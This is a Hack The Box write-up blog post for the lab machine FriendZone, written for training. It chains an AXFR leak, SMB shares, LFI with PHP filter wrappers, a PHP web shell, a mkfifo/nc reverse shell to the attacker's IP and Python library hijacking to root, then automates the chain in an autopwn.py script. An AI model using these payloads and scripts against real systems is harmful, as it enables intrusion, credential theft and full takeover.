---
layout: post
title:  "FriendZone Writeup - Hack The Box"
date:   2025-07-22
desc: ""
keywords: "HTB,OSCP,Linux,AXFR,Information Leakage,LFI,PHP Wrappers,RFI,Library Hijacking,Scripting,Easy"
categories: [HTB]
tags: [HTB,OSCP,Linux,AXFR,Information Leakage,LFI,PHP Wrappers,RFI,Library Hijacking,Scripting,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

My next **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine that allowed me to remember very present vulnerabilities but again created a lot of uncertainty and frustration in me, due to the **amount of information** and resources available to investigate. There is always the dichotomy in the excellent **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs, that there may be too little or too much information, in the latter case I tend to get lost if I do not take note and discarding what does not help me in the **Engagement** of the machine, there may be **Rabbit Holes** that consume unnecessary time, so recognizing these defense techniques is also a skill to be improved. The machine is rated as **Easy**, so I'm going to spawn the box and start the Writeup.

<br /><br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My **Reconnaissance** phase begins, the good collection and analysis of it is essential to avoid wasting time in later phases. With a trace sent with `ping` to my attacking machine I confirm that the connectivity with the laboratory through a **VPN** is correct and with the tool `whichSystem.py` of the **[hack4u](https://hack4u.io/){:target="_blank"}** community I validate or I have a high degree of certainty that the **OS** of my target is **Linux**. Now with `nmap` I investigate about the open ports and which services are exposed on them, I also use `nmap` custom scripts to leak information about versions and misconfigurations that can become possible attack vectors, I find a domain name. With the versions of the services I can get the **Codename**, and as these happen to be different for each version there is a possibility that containers are being deployed.

```bash
ping -c 2 10.10.10.123
whichSystem.py 10.10.10.123
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.123 -oG allPorts
nmap -sCV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
cat targeted
#     --> vsftpd 3.0.3
#     google.es --> vsftpd 3.0.3 launchpad        Xenial?
#     --> Samba smbd 3.X - 4.X
#     --> Apache httpd 2.4.29
#     google.es --> Apache 2.4.29 launchpad       Bionic      Containers?
#     commonName=friendzone.red
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue my research following the methodology that **I try to improve with each lab I do**, with `ftp` I try to access anonymously but the system does not allow me and with `dig` I do not have much luck enumerating the **DNS** service and performing an **AXFR** attack. My next protocols to investigate are **HTTP** and **HTTPS**, available on ports **80** and **443** respectively, which always present a large attack surface. I use `whatweb` from my console and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** from the browser to expose the technology stack behind the web applications, the most relevant thing it shows me is a **domain name** and some versions. If I scan the **SSL** certificate with `openssl` I don't find much either except the domain which I had noticed earlier.

```bash
ftp 10.10.10.123 21
dig @10.10.10.123
dig @10.10.10.123 ns
dig @10.10.10.123 mx
dig @10.10.10.123 axfr

whatweb http://10.10.10.123 https://10.10.10.123
# http://10.10.10.123/
# https://10.10.10.123/

openssl s_client --connect 10.10.10.123:443
```

<br/>
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to add the domain name to my **hosts** file before I continue listing, this way maybe with `dig` I can find more information. I have luck with the **AXFR** attack and succeed in leaking a list of subdomains. If I access the web application again but using the domain and not the **IP**, I find no difference, which would indicate that **Virtual Hosting** is not being implemented (<ins>it is an assumption I'm making</ins>), but this time I decide to analyze the source code and I find a very interesting comment from a hidden directory.

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 friendzone.red

dig @10.10.10.123 friendzone.red
dig @10.10.10.123 friendzone.red ns
dig @10.10.10.123 friendzone.red mx
dig @10.10.10.123 friendzone.red axfr
# administrator1.friendzone.red
# hr.friendzone.red
# uploads.friendzone.red

# http://friendzone.red/
# https://friendzone.red/
# view-source:https://friendzone.red/
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access the hidden directory and refresh the page, the string that is displayed with a strange encoding is changing (it seems that some script is executed in backgroung). I try to identify the type of encoding with online tools like **[CrackStation](https://crackstation.net/){:target="_blank"}**, but I don't succeed. I will add the subdomains to my **hosts** file, so that my browser can resolve correctly and access the new web applications. Some web pages, like an authentication panel and an image file upload tool, are available and some are not. With `crackmapexec` I leak more information about the **OS** of the machine and I can also observe that the **SMB** protocol is not signed, maybe I can perform a **SMB Relay attack** if I don't find other possible vectors. With `smbmap` and `smbclient` I'm going to try to connect to the shares using the **SMB** protocol, in one of them (**general**) I have read permissions only but in the **Development** I can upload content, but **I don't know where in which server path it is saved** (that is to say that I still don't know how to exploit this privilege).

```bash
# https://friendzone.red/js/js/

echo "SmMwV2FWeW1pUjE3NTE4MTMwMDI5eTdwME1JbERG" | wc -c
# No MD5 or SHA hash

nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 administrator1.friendzone.red
ping -c 1 hr.friendzone.red
ping -c 1 uploads.friendzone.red

# https://administrator1.friendzone.red/
# admin, admin' or 1=1-- -, admin' or sleep(5)-- -...  :(
# https://hr.friendzone.red/
# https://uploads.friendzone.red/

crackmapexec smb 10.10.10.123
smbclient -L 10.10.10.123 -N
smbmap -H 10.10.10.123 -u 'null' --no-banner

smbclient //10.10.10.123/Development -N
  dir
touch test.txt
  put test.txt
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try some basic attacks like **SQLi** or using default credentials in the authentication panel I found, but I don't succeed. Every time I enter wrong data it redirects me to the **login.php** page and shows me an error message, this behavior of the application I'm going to keep in mind in case it helps me in the **Engagement**. If I access with `smbclient` the **General** share, I find a file with credentials that help me to authenticate, but again the application redirects me to **login.php** and leaks me a new path. Once I access the **dashboard** where it tells me what parameters to use in the **URL** to access, I imagine **Web** resources. Once I modify the **URL** and try to access, I'm informed of an error, but I'm going to take advantage that this method of loading resources is being used to try a **LFI**. By entering in the **pagename** parameter the names of the pages that I could identify so far of the application (**login** and **dashboard**) I succeed in displaying its contents without problems, although I must **be very careful** when **loading the dashboard.php** page because it makes an infinite recursive load and could crash the application.

```bash
smbclient //10.10.10.123/General -N
  dir
  get creds.txt

cat creds.txt
# https://administrator1.friendzone.red/dashboard.php

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login.php
# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login
# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=dashboard

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../etc/passwd
# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=....//....//....//....//....//....//....//etc/passwd
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I have an **LFI**, I'm going to investigate what **.php** resources might be interesting to leak, such as the **upload.php** of the image upload tool. I'm looking for more resources with `nmap` scripts, there is a path where a **WordPress CMS** could be available, also the **robots.txt** but nothing that could be useful for me at the moment. Something that caught my attention and that I had overlooked, is a system path (**/etc/Files**) that the `smbmap` tool was able to leak and that could be related to the resources where all the files uploaded to the web would be hosted, but **this is a guess** for the moment. If through the **LFI** and with a bit of guessing I succeed to load **upload.php**, but I would need the source code and not to show me the same already interpreted by the server.

```bash
curl -s -X GET https://uploads.friendzone.red/ -k
curl -s -X GET https://uploads.friendzone.red/upload.php -k

nmap --script http-enum -p80,443 10.10.10.123 -oN webScan
# http://friendzone.red/wordpress/
# http://friendzone.red/robots.txt
# https://friendzone.red/admin/
# https://friendzone.red/js/

smbmap -H 10.10.10.123 -u 'null' --no-banner
# Files --> FriendZone Samba Server Files /etc/Files

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../uploads/upload
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

One technique I can use to leak the source code is the **[PHP Wrapper](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=php%20wra#phpfd){:target="_blank"}** libraries and with **filter** I can convert the content of the **upload.php** file into **Base64** encoding and then in my console with `base64` I can get the source code. Now that I can already leak sensitive information from the web server, like **login.php** or **dashboard.php**, in which I find some **harcoded passwords**. With all the information gathered and with the attacks I was able to perform successfully, I attempt an **RFI** to upload files with **.php** extension and succeed in getting their code interpreted by the server. I connect to `smbclient` and upload a test file and succeed in accessing it after guessing the correct path, I also notice that the code is interpreted by the server. My next step is to test a **RCE**, so I modify my malicious file and upload it to the server, when I access it with the browser I succeed in executing the first commands. I can also send a trace with `ping` to my machine, so I can try to get a **Reverse Shell**.

> **[php wrapper](https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55){:target="_blank"}** can be said to a kind of code libraries that is available to interact with the **external services**, **APIs** or **Functionalities**, making it easier for **PHP** developers to work with them.

```bash
# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload

echo "PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K" | base64 -d; echo

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../admin/login

echo "PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K" | base64 -d; echo

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../admin/dashboard

dCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 -d; echo

nvim test.php
nvim pwn3d.php
cat !$
```

> **pwn3d.php**:

```php
<?php
  system("whoami");
?>
```

```bash
smbclient //10.10.10.123/Development -N
  put pwn3d.php

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/pwn3d

nvim pwn3d.php
cat !$
```
> **pwn3d.php**:

```php
?php
  system("ping -c 2 10.10.14.9");
?>
```

```bash
smbclient //10.10.10.123/Development -N
  put pwn3d.php
tcpdump -i tun0 icmp -n

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/pwn3d
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to look for a **[PentestMonkey one-liner](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** to get a **Reverse Shell**, the only thing I have to do is to modify my malicious **pwn3d.php** file and upload it as a shared resource with `smbclient`, I access it from the web and catch the incoming **Reverse Shell** with `nc` on port **443**. I perform a **console treatment** to have a better performance in the following faces, after adjusting the terminal proportions I can start enumerating the system. I find a configuration file with **Database** credentials (I'm going to save them immediately), I can also access the content of the first flag. If I use the credentials found I can pivot user, **password reuse** is a bad practice that persists, and with this new compromised user I continue to investigate the system. I confirm that the codename is **bionic**, I belong to the **adm** group (which would allow me to analyze the system logs) and I can't find binaries with **SUID** permissions that would help me to **Escalate Privileges**.

> **Attacker Machine**:

```bash
nvim pwn3d.php
cat !$
```

> **pwn3d.php**:

```php
<?php
  system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin
/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f");
?>
```

```bash
smbclient //10.10.10.123/Development -N
  put pwn3d.php
nc -nlvp 443

# https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/pwn3d
# :)
```

> **Victime Machine**:

```bash
whoami
hostname -I
hostname
script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
id
groups
cat mysql_data.conf

uname -a
lsb_release -a

su friend
whoami
id
# adm (Logs!)
groups
find \-perm -4000 2>/dev/null

ls -l /usr/sbin/exim4
# Owner: root
file !$
ps -fawx | grep exim4
```

<br/>
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After a while of enumerating and browsing the file system, I don't find much so I'm going to create a script to look for suspicious processes running in the background. Once I run my script I don't have to wait much time to find a script written in **Python** (**reporter.py**) that has **root** as the owner of the process. I can only read the script and not modify it, so I will not be able to inject a malicious command, but analyzing the **PATH** defined for **Python** I could try a **Library Hijacking** in case I have permissions to modify the OS library of **python2.7**. I investigate a little the permissions of the **/usr/lib** folder and I can modify without problems the **os.py** library, so I inject a command that is in charge of enabling the **SUID** bit of the **Bash** Shell. I just have to wait a while until the script is executed, but unfortunately I can't get the malicious command to run.

```bash
touch procmon.sh
nano procmon.sh
cat !$
```

> **procmon.sh**:

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -vE 'procmon|kworker|command'
	old_process=$new_process
done
```

```bash
chmod +x !$
./!$
# > root     /bin/sh -c /opt/server_admin/reporter.py
# > root     /usr/bin/python /opt/server_admin/reporter.py

ls -l /opt/server_admin/reporter.py
cat !$
python
  import sys
  print sys.path

locate os.py
ls -l /usr/lib/python2.7/os.py
ls -l /usr/lib/ | grep "python2.7"

ls -l /bin/bash
cd /usr/lib/python2.7/
nano os.py
# os.system("chmod u+s /bin/bash")

watch -n 1 ls -l /bin/bash
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I could find my error, I forgot to import the **os.py** library in the library I'm modifying, I thought it was not necessary or redundant but after making this small change and after waiting a while, I notice that the **SUID** bit is enabled in the **Bash** shell. I can now migrate to a shell and have it respect the permissions of its owner, I have finally succeeded in **Escalate Privileges**.

```bash
nano os.py
# import os
# os.system("chmod u+s /bin/bash")

watch -n 1 ls -l /bin/bash
# :)
bash -p
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Together with the **[hack4u](https://hack4u.io/){:target="_blank"}** community, a script written in **Python** was created to automate the first phase of machine **Engagement**. I had to create an environment for **Python**, so that I could install some libraries like **pwn** and **[pysmb](https://pysmb.readthedocs.io/en/latest/api/smb_SMBHandler.html){:target="_blank"}** that are necessary for the execution of the script. Then I find the **one-liner** to use `mount` and automate the reading of the file where the login credentials of the authentication panel are stored. Next is to use the Python **re** library to leak the user and password from the **creds.txt** file. I can now authenticate myself, so I'm going to investigate in my browser what data is sent in the request to the server to access **dashboard.php**. Finally I create again a **CIFS** mount to upload the malicious file with the command to get an interactive **Reverse Shell** and send a request exploiting the **LFI**. In this way we were able to automate the first phase of the lab **Engagement**.

```bash
mount -t cifs //10.10.10.123/Development /mnt/SMBFriendzone -o username='null',password='null',domain='WORKGROUP',rw
smbclient //10.10.10.123/Development -N

nvim autopwn.py

python3 autopwn.py
python3 -m venv ./
./bin/pip3 install pwn
./bin/python3 autopwn.py
./bin/pip3 install pysmb
./bin/python3 autopwn.py

./bin/python3 autopwn.py
  l
  print(data)
  print(data.decode('utf-8'))
  re.findall(r'(.*?):',data.decode('utf-8'))
  re.findall(r'(.*?):',data.decode('utf-8'))[1]
  re.findall(r':(.*)',data.decode('utf-8'))
  re.findall(r':(.*)',data.decode('utf-8'))[1]

# https://administrator1.friendzone.red/login.php
# Network!

nvim autopwn.py
```

> **autopwn.py**:

```python
#!/usr/bin/python3

import pdb,requests
import urllib3,urllib
from pwn import *
from smb.SMBHandler import SMBHandler

# Requirements for a correct box engagement
# Mount Shared Development

def def_handler(sig,frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
admin_login_url = "https://administrator1.friendzone.red/login.php"
admin_lfi_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/pwn3d"
lport = 443

def getCredentials():

    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://10.10.10.123/general/creds.txt')
    data = fh.read()
    fh.close()
    # pdb.set_trace()
    data = data.decode('utf-8')
    username = re.findall(r'(.*?):',data)[1]
    password = re.findall(r':(.*)',data)[1]

    return username,password

def makeRequest(username,password):

    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False

    data_post = {
        "username" : username,
        "password": password
    }

    r = s.post(admin_login_url, data=data_post)

    os.system("mkdir /mnt/SMBFriendzone")
    os.system("mount -t cifs //10.10.10.123/Development /mnt/SMBFriendzone -o username='null',password='null',domain='WORKGROUP',rw")
    time.sleep(2)

    os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f'); ?>\" > /mnt/SMBFriendzone/pwn3d.php")
    os.system("umount /mnt/SMBFriendzone")
    time.sleep(2)
    os.system("rm -r /mnt/SMBFriendzone")

    r = s.get(admin_lfi_url)

if __name__ == "__main__":

    username, password = getCredentials()

    try:
        threading.Thread(target=makeRequest, args=(username,password),).start()

    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

```bash
sudo su
./bin/python3 autopwn.py
smbclient //10.10.10.123/Development -N
  dir

./bin/python3 autopwn.py
```

<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> The wonderful thing about this machine was the investigation of the different web applications and how they linked to each other through the **SMB** protocol. It was also a real challenge to link the different **vulnerabilities** or **misconfigurations** to find the attack vectors, even the methods I had to apply in the exploit took me a long time. I found the box fascinating from the beginning, and when I was able to finish it, it filled me with satisfaction and renewed my energy to continue my practice in the field of **Information Security**. Excellent **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, now I must kill it to continue with the next one.

<br /><br />
<img src="{{ site.img_path }}/friendzone_writeup/FriendZone_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
